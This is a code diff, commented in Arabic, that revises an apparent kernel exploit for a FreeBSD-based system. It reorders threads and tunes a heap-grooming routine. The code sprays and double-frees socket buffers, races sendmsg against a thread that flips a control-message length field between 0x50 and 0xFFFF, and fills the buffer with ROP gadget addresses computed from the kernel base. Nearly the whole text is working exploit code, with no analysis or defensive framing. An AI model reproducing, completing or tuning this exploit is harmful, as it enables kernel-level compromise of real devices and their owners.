@@ -19,27 +19,7 @@ struct cmsghdr *cmsg;
 int global_sock;
 int spray_socks[SPRAY_COUNT];
 
-// خيط الإرسال (دون تغيير)
-void *sendmsg_thread(void *arg) {
-    (void)arg;
-    struct msghdr msg = {0};
-    msg.msg_control = control_buf;
-    msg.msg_controllen = CONTROL_LEN;
-    while(1) { syscall(28, global_sock, &msg, 0); }
-    return NULL;
-}
-
-// خيط السباق (دون تغيير)
-void *race_thread(void *arg) {
-    (void)arg;
-    while(1) {
-        cmsg->cmsg_len = 0x50;   
-        cmsg->cmsg_len = 0xFFFF; 
-    }
-    return NULL;
-}
-
-// دالة التحرير الزوجي لتهيئة الذاكرة
+// دالة تهيئة الذاكرة (التحرير الزوجي الذي أثبت نجاحه في جلب 974f)
 void prepare_heap() {
     for(int i = 0; i < SPRAY_COUNT; i++) {
         spray_socks[i] = syscall(97, 2, 2, 0);
@@ -49,7 +29,6 @@ void prepare_heap() {
             syscall(133, spray_socks[i], dummy, 0x50, 0, NULL, 0);
         }
     }
-    // التحرير الزوجي لخلق فجوات
     for(int i = 0; i < SPRAY_COUNT; i += 2) {
         if(spray_socks[i] > 0) {
             syscall(6, spray_socks[i]);
@@ -58,34 +37,52 @@ void prepare_heap() {
     }
 }
 
+void *sendmsg_thread(void *arg) {
+    (void)arg;
+    struct msghdr msg = {0};
+    msg.msg_control = control_buf;
+    msg.msg_controllen = CONTROL_LEN;
+    while(1) { syscall(28, global_sock, &msg, 0); }
+    return NULL;
+}
+
+void *race_thread(void *arg) {
+    (void)arg;
+    while(1) {
+        cmsg->cmsg_len = 0x50;   
+        cmsg->cmsg_len = 0xFFFF; 
+    }
+    return NULL;
+}
+
 int _main(struct thread *td) {
     (void)td;
     initKernel();
     initLibc();
 
     uint64_t kbase = get_kernel_base();
-    
-    // 1. تهيئة الذاكرة أولاً
-    prepare_heap();
-
-    // 2. إعداد البفر بنفس الطريقة التي نجحت سابقاً
-    // وضعنا Gadget الدخول في كل مكان لضمان الإصابة
     uint64_t trigger = kbase + OFF_PUSH_RSP_POP_RSI_RET;
     uint64_t pop_rax = kbase + OFF_POP_RAX_RET;
     uint64_t signature = 0xDEADC0DE;
 
+    // تهيئة الذاكرة
+    prepare_heap();
+
+    // بناء البفر "الكثيف"
     memset(control_buf, 0, CONTROL_LEN);
     cmsg = (struct cmsghdr *)control_buf;
     cmsg->cmsg_level = 0; 
     cmsg->cmsg_type = 7;
     cmsg->cmsg_len = 0x50;
 
-    // ملء منطقة ext_free وما بعدها بالترتيب الصحيح
-    for (int i = 0x48; i < CONTROL_LEN - 24; i += 8) {
+    // ملء منطقة ext_free بتوقيعات متكررة جداً (Spray inside Buffer)
+    // نبدأ من 0x48 ونغطي أكبر مساحة ممكنة
+    for (int i = 0x48; i < CONTROL_LEN - 32; i += 8) {
         uint64_t *rop = (uint64_t *)(control_buf + i);
-        rop[0] = trigger;   // الدخول
-        rop[1] = pop_rax;   // الخطوة التالية
-        rop[2] = signature; // التوقيع
+        rop[0] = trigger;   // 3ee6
+        rop[1] = pop_rax;   // 974f
+        rop[2] = signature; // DEADC0DE
+        rop[3] = signature; // تكرار للتأكيد في حال وجود Padding من النواة
     }
 
     global_sock = syscall(97, 2, 2, 0);
